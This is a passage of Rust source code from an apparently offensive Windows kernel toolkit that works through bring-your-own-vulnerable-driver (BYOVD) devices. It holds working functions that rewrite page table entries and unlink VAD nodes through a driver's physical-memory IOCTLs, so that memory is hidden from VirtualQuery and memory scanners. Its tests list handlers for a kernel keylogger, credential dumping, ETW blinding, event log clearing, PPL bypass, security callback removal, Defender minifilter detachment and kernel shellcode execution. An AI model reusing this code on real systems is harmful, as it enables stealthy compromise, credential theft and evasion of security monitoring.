    let result = annotate_kernel_result(result, action_name, args, memoric_available_before);
    let result = attach_kernel_live_metadata(result, action_name, args);
    Ok(attach_kernel_preflight(result, preflight))
}

// ═════════════════════════════════════════════════════════════════════════════
// PTE/VAD Modification via BYOVD Driver
// ═════════════════════════════════════════════════════════════════════════════

/// Modify Page Table Entry via BYOVD driver — change page protection at the hardware level.
/// This is invisible to VirtualQuery and memory scanners that only check VAD/software protection.
///
/// Requires: loaded BYOVD driver, target virtual address, and the CR3 of the target process.
fn pte_modify_via_driver(args: &Value) -> Result<Value, String> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    let device_path = args
        .get("device_path")
        .and_then(|v| v.as_str())
        .ok_or("pte_modify requires device_path (e.g. '\\\\.\\RTCore64')")?;
    let read_ioctl = require_u32_param(args, "read_ioctl", "kernel", "pte_modify")?;
    let write_ioctl = require_u32_param(args, "write_ioctl", "kernel", "pte_modify")?;
    let virtual_addr = parse_address_arg(args.get("address"))
        .ok_or("pte_modify requires address (virtual address to modify)")?;
    let cr3 = parse_u64_arg(args.get("cr3"))
        .ok_or("pte_modify requires cr3 (page table base of target process)")?;
    let make_writable = args.get("writable").and_then(|v| v.as_bool());
    let make_executable = args.get("executable").and_then(|v| v.as_bool());

    tracing::warn!(
        "[KERNEL] PTE modify: VA 0x{:016X} CR3 0x{:016X}",
        virtual_addr,
        cr3
    );

    unsafe {
        // Open BYOVD device
        let dev_w: Vec<u16> = device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = CreateFileW(
            windows::core::PCWSTR(dev_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| format!("Open device: {}", e))?;

        // Helper: read 8 bytes from physical address via driver
        let phys_read8 = |addr: u64| -> Result<u64, String> {
            let input = addr.to_le_bytes();
            let mut output = [0u8; 8];
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                read_ioctl,
                Some(input.as_ptr() as *const _),
                8,
                Some(output.as_mut_ptr() as *mut _),
                8,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Phys read 0x{:016X}: {}", addr, e))?;
            Ok(u64::from_le_bytes(output))
        };

        // Helper: write 8 bytes to physical address
        let phys_write8 = |addr: u64, value: u64| -> Result<(), String> {
            let mut input = addr.to_le_bytes().to_vec();
            input.extend_from_slice(&value.to_le_bytes());
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                write_ioctl,
                Some(input.as_ptr() as *const _),
                input.len() as u32,
                None,
                0,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Phys write 0x{:016X}: {}", addr, e))?;
            Ok(())
        };

        // Walk x64 4-level page table: PML4 → PDPT → PD → PT
        let pml4_base = cr3 & 0x000F_FFFF_FFFF_F000;
        let pml4_idx = (virtual_addr >> 39) & 0x1FF;
        let pdpt_idx = (virtual_addr >> 30) & 0x1FF;
        let pd_idx = (virtual_addr >> 21) & 0x1FF;
        let pt_idx = (virtual_addr >> 12) & 0x1FF;

        // PML4E
        let pml4e_addr = pml4_base + pml4_idx * 8;
        let pml4e = phys_read8(pml4e_addr)?;
        if pml4e & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err(format!("PML4E not present at index {}", pml4_idx));
        }

        // PDPTE
        let pdpt_base = pml4e & 0x000F_FFFF_FFFF_F000;
        let pdpte_addr = pdpt_base + pdpt_idx * 8;
        let pdpte = phys_read8(pdpte_addr)?;
        if pdpte & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("PDPTE not present".to_string());
        }
        // Check for 1GB page (PS bit)
        if pdpte & (1 << 7) != 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("1GB large page — PTE modification not applicable".to_string());
        }

        // PDE
        let pd_base = pdpte & 0x000F_FFFF_FFFF_F000;
        let pde_addr = pd_base + pd_idx * 8;
        let pde = phys_read8(pde_addr)?;
        if pde & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("PDE not present".to_string());
        }
        // Check for 2MB page
        if pde & (1 << 7) != 0 {
            // Large page — modify PDE directly
            let mut new_pde = pde;
            if let Some(w) = make_writable {
                if w {
                    new_pde |= 1 << 1;
                } else {
                    new_pde &= !(1 << 1);
                }
            }
            if let Some(x) = make_executable {
                if x {
                    new_pde &= !(1u64 << 63);
                } else {
                    new_pde |= 1u64 << 63;
                }
            }
            phys_write8(pde_addr, new_pde)?;
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Ok(json!({
                "success": true,
                "technique": "pte_modify",
                "page_type": "2MB_large",
                "virtual_address": format!("0x{:016X}", virtual_addr),
                "pde_address": format!("0x{:016X}", pde_addr),
                "original_pde": format!("0x{:016X}", pde),
                "new_pde": format!("0x{:016X}", new_pde),
                "message": "2MB large page PDE modified"
            }));
        }

        // PTE (4KB page)
        let pt_base = pde & 0x000F_FFFF_FFFF_F000;
        let pte_addr = pt_base + pt_idx * 8;
        let pte = phys_read8(pte_addr)?;
        if pte & 1 == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("PTE not present".to_string());
        }

        let mut new_pte = pte;
        if let Some(w) = make_writable {
            if w {
                new_pte |= 1 << 1;
            } else {
                new_pte &= !(1 << 1);
            }
        }
        if let Some(x) = make_executable {
            if x {
                new_pte &= !(1u64 << 63);
            } else {
                new_pte |= 1u64 << 63;
            }
        }

        phys_write8(pte_addr, new_pte)?;

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        Ok(json!({
            "success": true,
            "technique": "pte_modify",
            "page_type": "4KB",
            "virtual_address": format!("0x{:016X}", virtual_addr),
            "pte_physical_address": format!("0x{:016X}", pte_addr),
            "original_pte": format!("0x{:016X}", pte),
            "new_pte": format!("0x{:016X}", new_pte),
            "page_walk": {
                "pml4e": format!("0x{:016X}", pml4e),
                "pdpte": format!("0x{:016X}", pdpte),
                "pde": format!("0x{:016X}", pde),
                "pte": format!("0x{:016X}", pte)
            },
            "flags": {
                "present": new_pte & 1 != 0,
                "writable": new_pte & (1 << 1) != 0,
                "user": new_pte & (1 << 2) != 0,
                "executable": new_pte & (1u64 << 63) == 0
            },
            "message": format!("PTE modified at physical 0x{:016X}. Protection change invisible to VirtualQuery.", pte_addr)
        }))
    }
}

/// Hide memory region by manipulating VAD (Virtual Address Descriptor) tree via BYOVD.
///
/// Walks EPROCESS→VadRoot red-black tree, finds the VAD node covering the target address,
/// and unlinks it. The memory remains accessible but invisible to VirtualQuery, memory scanners,
/// and Process Explorer.
fn vad_hide_via_driver(args: &Value) -> Result<Value, String> {
    use windows::Win32::Storage::FileSystem::{
        CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, OPEN_EXISTING,
    };
    use windows::Win32::System::IO::DeviceIoControl;

    let pid = require_u32_param(args, "pid", "kernel", "vad_hide")?;
    let target_addr = parse_address_arg(args.get("address"))
        .ok_or("vad_hide requires address (virtual address in target region)")?;
    let device_path = args
        .get("device_path")
        .and_then(|v| v.as_str())
        .ok_or("vad_hide requires device_path")?;
    let read_ioctl = require_u32_param(args, "read_ioctl", "kernel", "vad_hide")?;
    let write_ioctl = require_u32_param(args, "write_ioctl", "kernel", "vad_hide")?;

    // MMVAD offsets — Win10 20H2+ / Win11
    let vad_root_offset = args
        .get("vad_root_offset")
        .and_then(|value| parse_u64_arg(Some(value)))
        .unwrap_or(0x7D8) as u64;
    // MMVAD_SHORT structure offsets
    let starting_vpn_offset = args
        .get("starting_vpn_offset")
        .and_then(|value| parse_u64_arg(Some(value)))
        .unwrap_or(0x18) as u64;
    let ending_vpn_offset = args
        .get("ending_vpn_offset")
        .and_then(|value| parse_u64_arg(Some(value)))
        .unwrap_or(0x20) as u64;
    let left_child_offset = 0u64; // VadNode.Left is at offset 0 in RTL_BALANCED_NODE
    let right_child_offset = 8u64; // VadNode.Right at offset 8

    let target_vpn = target_addr >> 12; // Virtual Page Number

    tracing::warn!(
        "[KERNEL] VAD hide: PID {} address 0x{:016X} (VPN 0x{:X})",
        pid,
        target_addr,
        target_vpn
    );

    unsafe {
        // Find EPROCESS
        let eprocess = crate::kernel::find_eprocess_for_pid(pid).map_err(|e| e.to_string())?;
        if eprocess == 0 {
            return Err(format!("EPROCESS not found for PID {}", pid));
        }

        // Open BYOVD device
        let dev_w: Vec<u16> = device_path
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let handle = CreateFileW(
            windows::core::PCWSTR(dev_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            windows::Win32::Storage::FileSystem::FILE_SHARE_NONE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        )
        .map_err(|e| format!("Open device: {}", e))?;

        let kern_read8 = |addr: u64| -> Result<u64, String> {
            let input = addr.to_le_bytes();
            let mut output = [0u8; 8];
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                read_ioctl,
                Some(input.as_ptr() as *const _),
                8,
                Some(output.as_mut_ptr() as *mut _),
                8,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Kern read 0x{:016X}: {}", addr, e))?;
            Ok(u64::from_le_bytes(output))
        };

        let kern_read4 = |addr: u64| -> Result<u32, String> {
            let input = addr.to_le_bytes();
            let mut output = [0u8; 4];
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                read_ioctl,
                Some(input.as_ptr() as *const _),
                8,
                Some(output.as_mut_ptr() as *mut _),
                4,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Kern read4 0x{:016X}: {}", addr, e))?;
            Ok(u32::from_le_bytes(output))
        };

        let kern_write8 = |addr: u64, value: u64| -> Result<(), String> {
            let mut input = addr.to_le_bytes().to_vec();
            input.extend_from_slice(&value.to_le_bytes());
            let mut br = 0u32;
            DeviceIoControl(
                handle,
                write_ioctl,
                Some(input.as_ptr() as *const _),
                input.len() as u32,
                None,
                0,
                Some(&mut br),
                None,
            )
            .map_err(|e| format!("Kern write 0x{:016X}: {}", addr, e))?;
            Ok(())
        };

        // Read VadRoot (RTL_AVL_TREE at EPROCESS+VadRootOffset)
        // RTL_AVL_TREE.Root is at offset 0
        let vad_root_ptr = eprocess as u64 + vad_root_offset;
        let root_node = kern_read8(vad_root_ptr)?;

        if root_node == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err("VadRoot is empty".to_string());
        }

        // Walk the AVL tree to find the VAD covering our target VPN
        let mut current = root_node;
        let mut found_vad = 0u64;
        let mut depth = 0u32;
        let max_depth = 64;

        while current != 0 && depth < max_depth {
            depth += 1;

            let start_vpn = kern_read4(current + starting_vpn_offset)? as u64;
            let end_vpn = kern_read4(current + ending_vpn_offset)? as u64;

            if target_vpn >= start_vpn && target_vpn <= end_vpn {
                found_vad = current;
                break;
            }

            if target_vpn < start_vpn {
                current = kern_read8(current + left_child_offset)?;
            } else {
                current = kern_read8(current + right_child_offset)?;
            }
        }

        if found_vad == 0 {
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Err(format!(
                "No VAD found covering VPN 0x{:X} (depth {})",
                target_vpn, depth
            ));
        }

        let start_vpn = kern_read4(found_vad + starting_vpn_offset)? as u64;
        let end_vpn = kern_read4(found_vad + ending_vpn_offset)? as u64;

        // To unlink from AVL tree: read Left, Right, ParentValue
        let left = kern_read8(found_vad + left_child_offset)?;
        let right = kern_read8(found_vad + right_child_offset)?;

        // RTL_BALANCED_NODE.ParentValue is at offset 16, low 2 bits are balance/flags
        let parent_value = kern_read8(found_vad + 16)?;
        let parent_node = parent_value & !3u64;

        // Simple unlink: if node is a leaf (no children), just null the parent's pointer to us
        if left == 0 && right == 0 && parent_node != 0 {
            // Check which child we are
            let parent_left = kern_read8(parent_node + left_child_offset)?;
            if parent_left == found_vad {
                kern_write8(parent_node + left_child_offset, 0)?;
            } else {
                kern_write8(parent_node + right_child_offset, 0)?;
            }
        } else if left == 0 && right != 0 && parent_node != 0 {
            // Single right child: replace us with our right child
            let parent_left = kern_read8(parent_node + left_child_offset)?;
            if parent_left == found_vad {
                kern_write8(parent_node + left_child_offset, right)?;
            } else {
                kern_write8(parent_node + right_child_offset, right)?;
            }
            // Update child's parent pointer
            let child_parent = kern_read8(right + 16)?;
            let new_parent = (parent_node) | (child_parent & 3);
            kern_write8(right + 16, new_parent)?;
        } else if left != 0 && right == 0 && parent_node != 0 {
            // Single left child: replace us with our left child
            let parent_left = kern_read8(parent_node + left_child_offset)?;
            if parent_left == found_vad {
                kern_write8(parent_node + left_child_offset, left)?;
            } else {
                kern_write8(parent_node + right_child_offset, left)?;
            }
            let child_parent = kern_read8(left + 16)?;
            let new_parent = (parent_node) | (child_parent & 3);
            kern_write8(left + 16, new_parent)?;
        } else {
            // Two children or root node — complex rebalancing needed
            let _ = windows::Win32::Foundation::CloseHandle(handle);
            return Ok(json!({
                "success": false,
                "technique": "vad_hide",
                "pid": pid,
                "eprocess": format!("0x{:016X}", eprocess),
                "vad_node": format!("0x{:016X}", found_vad),
                "start_vpn": format!("0x{:X}", start_vpn),
                "end_vpn": format!("0x{:X}", end_vpn),
                "region": format!("0x{:016X} - 0x{:016X}", start_vpn << 12, (end_vpn + 1) << 12),
                "left_child": format!("0x{:016X}", left),
                "right_child": format!("0x{:016X}", right),
                "message": "VAD node has two children — AVL tree rebalancing required. Use kernel(action='write') to manually patch the tree, or hide a different allocation."
            }));
        }

        let _ = windows::Win32::Foundation::CloseHandle(handle);

        Ok(json!({
            "success": true,
            "technique": "vad_hide",
            "pid": pid,
            "eprocess": format!("0x{:016X}", eprocess),
            "vad_node": format!("0x{:016X}", found_vad),
            "start_vpn": format!("0x{:X}", start_vpn),
            "end_vpn": format!("0x{:X}", end_vpn),
            "hidden_region": format!("0x{:016X} - 0x{:016X}", start_vpn << 12, (end_vpn + 1) << 12),
            "hidden_size": format!("0x{:X}", ((end_vpn - start_vpn + 1) << 12)),
            "tree_depth": depth,
            "message": format!("VAD node unlinked. Region 0x{:016X}-0x{:016X} is now invisible to VirtualQuery/memory scanners.", start_vpn << 12, (end_vpn + 1) << 12)
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn skip_raw_string(source: &str, start: usize) -> Option<usize> {
        let bytes = source.as_bytes();
        let mut cursor = start;
        if bytes.get(cursor) == Some(&b'b') {
            cursor += 1;
        }
        if bytes.get(cursor) != Some(&b'r') {
            return None;
        }
        cursor += 1;

        let hash_start = cursor;
        while bytes.get(cursor) == Some(&b'#') {
            cursor += 1;
        }
        if bytes.get(cursor) != Some(&b'"') {
            return None;
        }
        let hashes = cursor - hash_start;
        cursor += 1;

        while cursor < bytes.len() {
            if bytes[cursor] == b'"' {
                let hash_end = cursor + 1 + hashes;
                if hash_end <= bytes.len()
                    && bytes[cursor + 1..hash_end].iter().all(|byte| *byte == b'#')
                {
                    return Some(hash_end);
                }
            }
            cursor += 1;
        }

        None
    }

    fn skip_quoted(source: &str, start: usize, quote: u8) -> usize {
        let bytes = source.as_bytes();
        let mut cursor = start + 1;
        let mut escaped = false;
        while cursor < bytes.len() {
            let byte = bytes[cursor];
            if escaped {
                escaped = false;
            } else if byte == b'\\' {
                escaped = true;
            } else if byte == quote {
                return cursor + 1;
            }
            cursor += 1;
        }
        bytes.len()
    }

    fn find_matching_brace(source: &str, open: usize) -> Option<usize> {
        let bytes = source.as_bytes();
        let mut cursor = open + 1;
        let mut depth = 1usize;

        while cursor < bytes.len() {
            if let Some(end) = skip_raw_string(source, cursor) {
                cursor = end;
                continue;
            }

            match bytes[cursor] {
                b'/' if bytes.get(cursor + 1) == Some(&b'/') => {
                    cursor += 2;
                    while cursor < bytes.len() && bytes[cursor] != b'\n' {
                        cursor += 1;
                    }
                }
                b'/' if bytes.get(cursor + 1) == Some(&b'*') => {
                    cursor += 2;
                    while cursor + 1 < bytes.len()
                        && !(bytes[cursor] == b'*' && bytes[cursor + 1] == b'/')
                    {
                        cursor += 1;
                    }
                    cursor = (cursor + 2).min(bytes.len());
                }
                b'"' => cursor = skip_quoted(source, cursor, b'"'),
                b'\'' => cursor = skip_quoted(source, cursor, b'\''),
                b'{' => {
                    depth += 1;
                    cursor += 1;
                }
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(cursor);
                    }
                    cursor += 1;
                }
                _ => cursor += 1,
            }
        }

        None
    }

    fn direct_driver_function_bodies(source: &str) -> Vec<(String, &str)> {
        let mut bodies = Vec::new();
        let mut cursor = 0usize;

        while let Some(relative_start) = source[cursor..].find("fn driver_") {
            let start = cursor + relative_start;
            let name_start = start + "fn ".len();
            let Some(name_end) = source[name_start..].find('(').map(|idx| name_start + idx) else {
                break;
            };
            let Some(open_brace) = source[name_end..].find('{').map(|idx| name_end + idx) else {
                break;
            };
            let Some(close_brace) = find_matching_brace(source, open_brace) else {
                panic!(
                    "could not find matching brace for {}",
                    &source[name_start..name_end]
                );
            };
            bodies.push((
                source[name_start..name_end].to_string(),
                &source[open_brace + 1..close_brace],
            ));
            cursor = close_brace + 1;
        }

        bodies
    }

    #[test]
    fn direct_driver_handlers_open_driver_only_after_registry_preflight() {
        let source = include_str!("kernel_tool.rs");
        let mut driver_openers = 0usize;

        for (name, body) in direct_driver_function_bodies(source) {
            let Some(driver_open) = body.find("MemoricDriver::ensure(") else {
                continue;
            };
            driver_openers += 1;
            let Some(registry_preflight) = body.find("normalized_kernel_registry_args(") else {
                panic!("{name} opens memoric.sys without registry-backed argument preflight");
            };
            assert!(
                registry_preflight < driver_open,
                "{name} must run registry-backed argument preflight before opening memoric.sys"
            );
        }

        assert!(
            driver_openers > 40,
            "expected broad direct driver handler coverage, found {driver_openers}"
        );
    }

    #[test]
    fn status_is_probe_only_and_does_not_autoload_driver() {
        let result = handle_kernel(&json!({"action": "status", "build_number": 26100}))
            .expect("kernel status should be a local readiness probe");

        assert_eq!(result["success"], true);
        assert_eq!(result["probe_only"], true);
        assert_eq!(result["driver_auto_installed"], false);
        assert_eq!(result["offset_profile"]["build_number"], 26100);
    }

    #[test]
    fn write_requires_device_path_before_ioctl_fields() {
        let error = handle_kernel(&json!({"action": "write"}))
            .expect_err("kernel write should require BYOVD device path first");

        assert!(error.contains("kernel_preflight_failed"));
        assert!(error.contains("kernel(action='write')"));
        assert!(error.contains("device_path"));
    }

    #[test]
    fn driver_global_hook_rejects_path_like_target_module_before_driver_open() {
        let error = driver_global_hook(&json!({
            "target_module": "C:\\Windows\\System32\\ntoskrnl.exe"
        }))
        .expect_err("module paths should fail before driver open");

        assert!(error.contains("kernel(action='driver_global_hook')"));
        assert!(error.contains("target_module"));
        assert!(error.contains("path separators"));
    }

    #[test]
    fn direct_kernel_handlers_reject_unknown_selectors_before_driver_open() {
        let cases: &[(&str, &str, &str, fn(&Value) -> Result<Value, String>)] = &[
            (
                "driver_handle_strip",
                "strip_type",
                "handle",
                driver_handle_strip,
            ),
            (
                "driver_reg_protect",
                "reg_action",
                "drop",
                driver_reg_protect,
            ),
            (
                "driver_reg_protect",
                "reg_flags",
                "rename",
                driver_reg_protect,
            ),
            ("driver_dpc_timer", "dpc_action", "pause", driver_dpc_timer),
            ("driver_cr_rw", "cr_action", "rotate", driver_cr_rw),
            ("driver_idt_rw", "idt_action", "patch", driver_idt_rw),
            (
                "driver_unloaded_drv_clear",
                "unloaded_action",
                "delete",
                driver_unloaded_drv_clear,
            ),
            (
                "driver_token_swap",
                "swap_action",
                "replace",
                driver_token_swap,
            ),
            (
                "driver_process_protect",
                "protect_action",
                "hide",
                driver_process_protect,
            ),
            (
                "driver_keylogger",
                "keylog_action",
                "dump",
                driver_keylogger,
            ),
            ("driver_reg_hide", "reg_action", "drop", driver_reg_hide),
            ("driver_file_lock", "lock_action", "drop", driver_file_lock),
            ("driver_etw_blind", "etw_action", "drop", driver_etw_blind),
            (
                "driver_eprocess_spoof",
                "spoof_action",
                "rename",
                driver_eprocess_spoof,
            ),
            (
                "driver_event_log_clear",
                "log_action",
                "delete",
                driver_event_log_clear,
            ),
            ("driver_cred_dump", "cred_action", "scan", driver_cred_dump),
            (
                "driver_impersonate",
                "imp_action",
                "replace",
                driver_driver_impersonate,
            ),
            (
                "driver_object_hook",
                "obj_action",
                "replace",
                driver_object_hook,
            ),
            (
                "driver_testsign_hide",
                "testsign_action",
                "enable",
                driver_testsign_hide,
            ),
            (
                "driver_global_hook",
                "hook_action",
                "patch",
                driver_global_hook,
            ),
            (
                "driver_global_hook",
                "hook_type",
                "ssdt",
                driver_global_hook,
            ),
            (
                "driver_infinity_hook",
                "infhook_action",
                "patch",
                driver_infinity_hook,
            ),
            (
                "driver_ci_callback_patch",
                "ci_action",
                "disable",
                driver_ci_callback_patch,
            ),
            (
                "driver_ci_func_patch",
                "ci_action",
                "disable",
                driver_ci_func_patch,
            ),
            ("driver_pte_rw", "pte_action", "patch", driver_pte_rw),
            ("driver_msr_rw", "msr_action", "patch", driver_msr_rw),
            ("driver_cloak", "cloak_action", "hide", driver_cloak),
            (
                "driver_force_kill",
                "kill_method",
                "force",
                driver_force_kill,
            ),
            (
                "driver_system_thread",
                "thread_action",
                "stop",
                driver_system_thread,
            ),
            (
                "driver_kernel_exec",
                "exec_action",
                "patch",
                driver_kernel_exec,
            ),
            ("driver_ppl_bypass", "ppl_action", "hide", driver_ppl_bypass),
            (
                "driver_callback_nuke",
                "cb_action",
                "drop",
                driver_callback_nuke,
            ),
            (
                "driver_callback_nuke",
                "cb_type",
                "handle",
                driver_callback_nuke,
            ),
            (
                "driver_minifilter_detach",
                "mf_action",
                "drop",
                driver_minifilter_detach,
            ),
            (
                "driver_kernel_apc",
                "apc_action",
                "queue",
                driver_kernel_apc,
            ),
            ("driver_wfp_remove", "wfp_action", "drop", driver_wfp_remove),
        ];

        for (action, field, bad_value, handler) in cases {
            let mut args = json!({ "action": action });
            if matches!(*action, "driver_handle_strip" | "driver_force_kill") {
                args["pid"] = json!(500);
            }
            args[field] = json!(bad_value);
            let error = match handler(&args) {
                Ok(_) => panic!("kernel(action='{action}') should reject {field}"),
                Err(error) => error,
            };

            assert!(
                error.contains(&format!("kernel(action='{action}')")),
                "{action} error should identify the action: {error}"
            );
            assert!(
                error.contains(field),
                "{action} error should identify the field: {error}"
            );
            assert!(
                error.contains(bad_value),
                "{action} error should echo the invalid selector: {error}"
            );
            assert!(
                !error.contains("failed to ensure memoric.sys"),
                "{action} selector validation should run before driver ensure: {error}"
            );
        }

        let debug_error = driver_set_debug_port(&json!({
            "pid": 4,
            "debug_action": "attach"
        }))
        .expect_err("driver_set_debug_port should reject unknown debug_action");
        assert!(debug_error.contains("kernel(action='driver_set_debug_port')"));
        assert!(debug_error.contains("debug_action"));
        assert!(debug_error.contains("attach"));
        assert!(!debug_error.contains("failed to ensure memoric.sys"));

        let dpc_operation_error = driver_dpc_timer(&json!({
            "dpc_action": "schedule",
            "dpc_operation": "patch"
        }))
        .expect_err("driver_dpc_timer should reject unknown dpc_operation");
        assert!(dpc_operation_error.contains("kernel(action='driver_dpc_timer')"));
        assert!(dpc_operation_error.contains("dpc_operation"));
        assert!(dpc_operation_error.contains("patch"));
        assert!(!dpc_operation_error.contains("failed to ensure memoric.sys"));
    }

    #[test]
    fn direct_kernel_handlers_reject_missing_registry_required_params_before_driver_open() {
        type Handler = fn(&Value) -> Result<Value, String>;

        let cases: Vec<(&str, Value, &str, Handler)> = vec![
            ("driver_process_dump", json!({}), "pid", driver_process_dump),
            (
                "driver_pte_rw",
                json!({"pte_action": "write", "address": 0x1000_u64}),
                "new_pte",
                driver_pte_rw,
            ),
            (
                "driver_msr_rw",
                json!({"msr_action": "write", "msr_index": 0xC000_0082_u64}),
                "msr_value",
                driver_msr_rw,
            ),
            (
                "driver_object_hook",
                json!({"obj_action": "register"}),
                "protect_pid",
                driver_object_hook,
            ),
            (
                "driver_system_thread",
                json!({"thread_action": "create"}),
                "thread_start",
                driver_system_thread,
            ),
            (
                "driver_kernel_exec",
                json!({}),
                "shellcode_bytes",
                driver_kernel_exec,
            ),
            (
                "driver_kernel_exec",
                json!({"exec_action": "free"}),
                "alloc_address",
                driver_kernel_exec,
            ),
            (
                "driver_cloak",
                json!({"cloak_action": "target"}),
                "driver_name",
                driver_cloak,
            ),
            (
                "driver_force_delete",
                json!({}),
                "file_path",
                driver_force_delete,
            ),
            (
                "driver_reg_hide",
                json!({"reg_action": "add"}),
                "key_path",
                driver_reg_hide,
            ),
            (
                "driver_file_lock",
                json!({"lock_action": "remove"}),
                "file_path",
                driver_file_lock,
            ),
            (
                "driver_ppl_bypass",
                json!({"ppl_action": "strip"}),
                "pid",
                driver_ppl_bypass,
            ),
            (
                "driver_token_swap",
                json!({}),
                "target_pid",
                driver_token_swap,
            ),
            (
                "driver_process_protect",
                json!({"protect_action": "set"}),
                "pid",
                driver_process_protect,
            ),
            (
                "driver_cred_dump",
                json!({"cred_action": "read", "pid": 500}),
                "address",
                driver_cred_dump,
            ),
            (
                "driver_impersonate",
                json!({
                    "imp_action": "swap",
                    "target_path": "\\??\\C:\\Windows\\System32\\drivers\\target.sys"
                }),
                "legit_path",
                driver_driver_impersonate,
            ),
            (
                "driver_callback_nuke",
                json!({"cb_action": "remove"}),
                "index",
                driver_callback_nuke,
            ),
            (
                "driver_minifilter_detach",
                json!({"mf_action": "detach", "filter_name": "WdFilter"}),
                "frame_id",
                driver_minifilter_detach,
            ),
            (
                "driver_kernel_apc",
                json!({"pid": 500}),
                "tid",
                driver_kernel_apc,
            ),
            (
                "driver_kernel_apc",
                json!({"apc_action": "dll", "pid": 500, "tid": 42}),
                "dll_path",
                driver_kernel_apc,
            ),
            (
                "driver_wfp_remove",
                json!({"wfp_action": "remove"}),
                "callout_id",
                driver_wfp_remove,
            ),
            (
                "driver_port_hide",
                json!({"port_action": "add"}),
                "port",
                driver_port_hide,
            ),
            (
                "driver_token_dup",
                json!({"pid": 500, "token_action": "copy"}),
                "source_pid",
                driver_token_dup,
            ),
            (
                "driver_global_hook",
                json!({
                    "hook_action": "install",
                    "target_module": "ntoskrnl.exe",
                    "target_function": "NtQuerySystemInformation"
                }),
                "replacement_addr",
                driver_global_hook,
            ),
            (
                "driver_global_hook",
                json!({"hook_action": "remove"}),
                "hook_index",
                driver_global_hook,
            ),
            (
                "driver_infinity_hook",
                json!({"infhook_action": "enable"}),
                "syscall_number",
                driver_infinity_hook,
            ),
            (
                "driver_infinity_hook",
                json!({"infhook_action": "enable", "syscall_number": 0x33}),
                "handler_address",
                driver_infinity_hook,
            ),
            (
                "driver_unloaded_drv_clear",
                json!({"unloaded_action": "clear_name"}),
                "driver_name",
                driver_unloaded_drv_clear,
            ),
            (
                "driver_etw_blind",
                json!({"etw_action": "disable"}),
                "provider_guid",
                driver_etw_blind,
            ),
            (
                "driver_eprocess_spoof",
                json!({"spoof_action": "image_name", "pid": 500}),
                "new_image_name",
                driver_eprocess_spoof,
            ),
            (
                "driver_cr_rw",
                json!({"cr_action": "write", "cr_index": 4}),
                "value",
                driver_cr_rw,
            ),
            (
                "driver_idt_rw",
                json!({"idt_action": "write", "vector": 0x2E}),
                "new_handler",
                driver_idt_rw,
            ),
        ];

        for (action, args, missing, handler) in cases {
            let error = match handler(&args) {
                Ok(_) => panic!("kernel(action='{action}') should require {missing}"),
                Err(error) => error,
            };
            assert!(
                error.contains(&format!("kernel(action='{action}')")),
                "{action} error should identify action: {error}"
            );
            assert!(
                error.contains(&format!("requires '{missing}'")),
                "{action} error should identify missing {missing}: {error}"
            );
            assert!(
                !error.contains("failed to ensure memoric.sys"),
                "{action} required validation should run before driver ensure: {error}"
            );
        }
    }

    #[test]
    fn direct_kernel_registry_requirement_validation_honors_alias_normalization() {
        let normalized = normalized_kernel_registry_args(
            &json!({"obj_action": "register", "pid": 500}),
            "driver_object_hook",
        )
        .expect("pid alias should satisfy protect_pid before driver open");

        assert_eq!(normalized["action"], "driver_object_hook");
        assert_eq!(normalized["protect_pid"], 500);
    }

    #[test]
    fn direct_kernel_handlers_reject_registry_bounds_and_parser_errors_before_driver_open() {
        type Handler = fn(&Value) -> Result<Value, String>;

        let cases: Vec<(&str, Value, Handler, Vec<&str>)> = vec![
            (
                "driver_enum_process",
                json!({"max_entries": 1025}),
                driver_enum_process,
                vec!["max_entries", "<= 1024"],
            ),
            (
                "driver_callback_enum",
                json!({"max_entries": 65}),
                driver_callback_enum,
                vec!["max_entries", "<= 64"],
            ),
            (
                "driver_memory_pool",
                json!({"max_entries": 257}),
                driver_memory_pool,
                vec!["max_entries", "<= 256"],
            ),
            (
                "driver_memory_pool",
                json!({"pool_tag": "TooLong"}),
                driver_memory_pool,
                vec!["pool_tag", "1-4 byte ASCII"],
            ),
            (
                "driver_keylogger",
                json!({"max_keys": 513}),
                driver_keylogger,
                vec!["max_keys", "<= 512"],
            ),
            (
                "driver_kernel_apc",
                json!({
                    "pid": 500,
                    "tid": 42,
                    "shellcode_addr": "0x1000",
                    "shellcode_size": 0
                }),
                driver_kernel_apc,
                vec!["shellcode_size", ">= 1"],
            ),
            (
                "driver_auto_inject",
                json!({"inject_flags": [42]}),
                driver_auto_inject,
                vec!["inject_flags", "array items to be strings"],
            ),
            (
                "driver_auto_inject",
                json!({"auto_action": "launch"}),
                driver_auto_inject,
                vec!["inject_action", "launch"],
            ),
            (
                "driver_pe_dump",
                json!({"pid": 500, "output_path": "bad\u{0}path"}),
